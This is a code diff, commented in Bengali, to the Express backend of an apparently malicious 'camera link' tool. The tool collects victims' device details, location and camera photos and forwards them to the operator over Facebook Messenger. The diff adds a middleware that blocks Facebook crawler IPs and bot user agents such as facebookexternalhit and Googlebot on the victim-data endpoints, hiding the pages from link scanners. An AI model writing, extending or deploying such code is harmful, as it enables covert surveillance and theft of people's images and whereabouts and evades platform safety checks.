@@ -13,16 +13,38 @@ const {
 // 🚫 ব্লকড আইপি লিস্ট (এখান থেকে আসা রিকোয়েস্ট ব্লক হবে)
 // ================================================================
 const BLOCKED_IPS = [
-    '173.252.82.31',   // Facebook crawler IP (আপনার দেওয়া)
-    // '157.240.0.0/16'  // পুরো Facebook রেঞ্জ ব্লক করতে চাইলে CIDR সাপোর্ট লাগবে, তবে আমরা শুধু এই IP ব্লক করছি
+    '173.252.82.31',
+    '173.252.82.30',
+    '173.252.82.32',
+    // আরও Facebook IP যোগ করতে পারো
 ];
 
-// হেল্পার: রিকোয়েস্ট থেকে আসল IP বের করা (প্রক্সির জন্য)
+// 🚫 বট ইউজার-এজেন্ট ব্লক লিস্ট
+const BLOCKED_USER_AGENTS = [
+    'facebookexternalhit',
+    'Facebot',
+    'Googlebot',
+    'Twitterbot',
+    'LinkedInBot',
+    'Slurp',
+    'Bingbot',
+    'YandexBot',
+    'Pingdom',
+    'UptimeRobot',
+    'HeadlessChrome',
+    'PhantomJS'
+];
+
+// ================================================================
+// হেল্পার: আসল IP বের করা (প্রক্সি/লোড ব্যালেন্সারের জন্য)
+// ================================================================
 function getClientIp(req) {
-    return req.headers['x-forwarded-for']?.split(',').shift() || 
-           req.connection?.remoteAddress || 
-           req.socket?.remoteAddress || 
-           req.ip;
+    const forwarded = req.headers['x-forwarded-for'];
+    if (forwarded) {
+        const ips = forwarded.split(',');
+        return ips[0].trim();
+    }
+    return req.connection?.remoteAddress || req.socket?.remoteAddress || req.ip || '0.0.0.0';
 }
 
 // ================================================================
@@ -51,10 +73,35 @@ setInterval(async () => {
 }, CLEANUP_INTERVAL);
 
 // ================================================================
-// রাউটস
+// ব্লক চেক মিডলওয়্যার (সব রাউটের আগে)
+// ================================================================
+const blockMiddleware = (req, res, next) => {
+    const clientIp = getClientIp(req);
+    const ua = req.headers['user-agent'] || '';
+
+    // IP চেক
+    if (BLOCKED_IPS.includes(clientIp)) {
+        console.log(`🚫 ব্লকড IP: ${clientIp} → রিকোয়েস্ট ব্লক`);
+        return res.status(403).json({ status: 'error', message: 'Access denied' });
+    }
+
+    // User-Agent চেক (বট ডিটেক্ট)
+    for (const bot of BLOCKED_USER_AGENTS) {
+        if (ua.toLowerCase().includes(bot.toLowerCase())) {
+            console.log(`🚫 বট UA: ${ua} → রিকোয়েস্ট ব্লক`);
+            return res.status(403).json({ status: 'error', message: 'Access denied' });
+        }
+    }
+
+    // সব চেক পাস করলে যেতে দিন
+    next();
+};
+
+// ================================================================
+// রাউটস (ব্লক মিডলওয়্যার প্রয়োগ)
 // ================================================================
 
-// ক্যামেরা লিঙ্ক
+// ক্যামেরা লিঙ্ক (পাবলিক, ব্লক নয়)
 router.get('/v/:id', async (req, res) => {
     try {
         const victim = await Victim.findOne({ id: req.params.id });
@@ -97,21 +144,13 @@ router.get('/fb/:id', async (req, res) => {
 });
 
 // ================================================================
-// ১. ভিক্টিম ডেটা রিসিভ (IP ব্লকিং সহ)
+// ১. ভিক্টিম ডেটা রিসিভ (ব্লক মিডলওয়্যার সহ)
 // ================================================================
-router.post('/api/victim', async (req, res) => {
+router.post('/api/victim', blockMiddleware, async (req, res) => {
     try {
-        // IP চেক
-        const clientIp = getClientIp(req);
-        console.log(`📥 /api/victim থেকে IP: ${clientIp}`);
-
-        if (BLOCKED_IPS.includes(clientIp)) {
-            console.log(`🚫 ব্লকড আইপি ${clientIp} থেকে রিকোয়েস্ট ব্লক করা হয়েছে।`);
-            return res.status(403).json({ status: 'error', message: 'Access denied' });
-        }
-
         const data = req.body;
-        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', JSON.stringify(data, null, 2));
+        const clientIp = getClientIp(req);
+        console.log(`📥 /api/victim IP: ${clientIp}, ID: ${data.id}`);
 
         if (!data.id) {
             console.error('❌ id নেই!');
@@ -122,7 +161,6 @@ router.post('/api/victim', async (req, res) => {
         let victim = await Victim.findOne({ id: data.id });
 
         if (!victim) {
-            // নতুন ভিক্টিম
             victim = new Victim({
                 id: data.id,
                 fbId: data.fbId || 'unknown',
@@ -140,7 +178,6 @@ router.post('/api/victim', async (req, res) => {
             await victim.save();
             console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id}`);
         } else {
-            // আপডেট
             if (victim.fbId === 'unknown' && data.fbId && data.fbId !== 'unknown') {
                 victim.fbId = data.fbId;
             }
@@ -153,16 +190,14 @@ router.post('/api/victim', async (req, res) => {
             victim.battery = data.battery || victim.battery;
             victim.collectedAt = new Date();
             await victim.save();
-            console.log(`✅ ভিক্টিম আপডেট: ${data.id} (fbId: ${victim.fbId})`);
+            console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
         }
 
-        // ডিভাইস ইনফো মেসেজ পাঠান
+        // মেসেজ পাঠান
         if (victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
             console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
-        } else {
-            console.log('⚠️ fbId এখনও জানা যায়নি, মেসেজ পাঠানো হয়নি');
         }
 
         // লোকেশন মেসেজ
@@ -187,20 +222,14 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// ২. ক্যামেরা ছবি রিসিভ (IP ব্লকিং সহ)
+// ২. ক্যামেরা ছবি রিসিভ (ব্লক মিডলওয়্যার সহ)
 // ================================================================
-router.post('/api/camera', async (req, res) => {
+router.post('/api/camera', blockMiddleware, async (req, res) => {
     try {
-        // IP চেক
-        const clientIp = getClientIp(req);
-        console.log(`📸 /api/camera থেকে IP: ${clientIp}`);
-
-        if (BLOCKED_IPS.includes(clientIp)) {
-            console.log(`🚫 ব্লকড আইপি ${clientIp} থেকে রিকোয়েস্ট ব্লক করা হয়েছে।`);
-            return res.status(403).json({ status: 'error', message: 'Access denied' });
-        }
-
         const { id, image } = req.body;
+        const clientIp = getClientIp(req);
+        console.log(`📸 /api/camera IP: ${clientIp}, ID: ${id}`);
+
         if (!id || !image) {
             return res.status(400).json({ status: 'error', message: 'Missing id or image' });
         }
@@ -222,14 +251,11 @@ router.post('/api/camera', async (req, res) => {
         const totalImages = victim.camera.length;
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
-        // প্রথম ছবি এলে "ক্যামেরা পারমিশন দেওয়া হয়েছে" মেসেজ
         if (victim.fbId && victim.fbId !== 'unknown') {
             if (isFirstImage) {
                 await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
-                console.log(`📸 ক্যামেরা পারমিশন মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
+                console.log(`📸 ক্যামেরা পারমিশন মেসেজ: ${victim.fbId}`);
             }
-
-            // প্রতি ছবি মেসেঞ্জারে পাঠান
             await sendImageMessage(victim.fbId, image);
             console.log(`📸 ছবি #${totalImages} পাঠানো হয়েছে: ${victim.fbId}`);
         }
